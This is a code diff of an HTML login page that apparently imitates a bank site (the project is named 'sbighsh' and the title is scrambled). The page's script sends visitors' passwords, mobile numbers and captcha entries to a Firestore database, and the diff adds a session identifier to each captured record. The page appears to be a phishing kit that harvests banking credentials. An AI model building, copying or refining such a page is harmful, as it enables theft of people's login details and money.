@@ -5,11 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>sbynorewdpolnt</title>
   <style>
-    /* Aapka pura CSS yahan rahega (same as before) */
-    /* For brevity, aapka original CSS waisa ka waisa hi use karein */
-    body { font-family: Arial, sans-serif; background-color: #eef2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
-    
-  <style>
     body {
       font-family: Arial, sans-serif;
       background-color: #eef2f5;
@@ -58,14 +53,6 @@
       display: block;
       margin: 0 auto 10px auto;
     }
-    .welcome {
-      font-size: 22px;
-      font-weight: bold;
-      margin-bottom: 5px;
-      color: #333;
-      text-align: left;
-      padding-left: 20px;
-    }
     .sub-welcome {
       font-size: 14px;
       color: #4e0a69;
@@ -104,11 +91,7 @@
     .form-group input:focus {
       border-bottom: 2px solid #6a1b9a;
     }
-    .form-group input:focus + label {
-      transform: translateY(-20px);
-      font-size: 12px;
-      color: #6a1b9a;
-    }
+    .form-group input:focus + label,
     .form-group input:not(:placeholder-shown) + label {
       transform: translateY(-20px);
       font-size: 12px;
@@ -165,7 +148,6 @@
       border-radius: 6px;
       margin-top: 10px;
     }
-    /* Loading Overlay */
     .overlay {
       position: fixed;
       top: 0;
@@ -200,7 +182,6 @@
       text-align: center;
       max-width: 80%;
     }
-    /* Mobile responsive styles */
     @media (max-width: 600px) {
       .container {
         width: 90%;
@@ -222,27 +203,30 @@
   </style>
 </head>
 <body>
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 
-  <script>
-    // Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
-      authDomain: "sbighsh.firebaseapp.com",
-      projectId: "sbighsh",
-      storageBucket: "sbighsh.firebasestorage.app",
-      messagingSenderId: "685947657107",
-      appId: "1:685947657107:web:471a0557bb72235272a666"
-    };
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+    authDomain: "sbighsh.firebaseapp.com",
+    projectId: "sbighsh",
+    storageBucket: "sbighsh.firebasestorage.app",
+    messagingSenderId: "685947657107",
+    appId: "1:685947657107:web:471a0557bb72235272a666"
+  };
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-  </script>
-</head>
-<body>
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // STEP 1: Session ID Generate
+  let sessionId = sessionStorage.getItem('sessionId');
+  if (!sessionId) {
+    sessionId = 'session_' + Date.now() + '_' + Math.floor(Math.random() * 100000);
+    sessionStorage.setItem('sessionId', sessionId);
+  }
+</script>
 
 <!-- Loading Overlay -->
 <div class="overlay" id="overlay">
@@ -325,6 +309,7 @@
       password: password,
       mobile: mobile,
       captcha: captcha,
+      sessionId: sessionId,
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     })
     .then(() => {
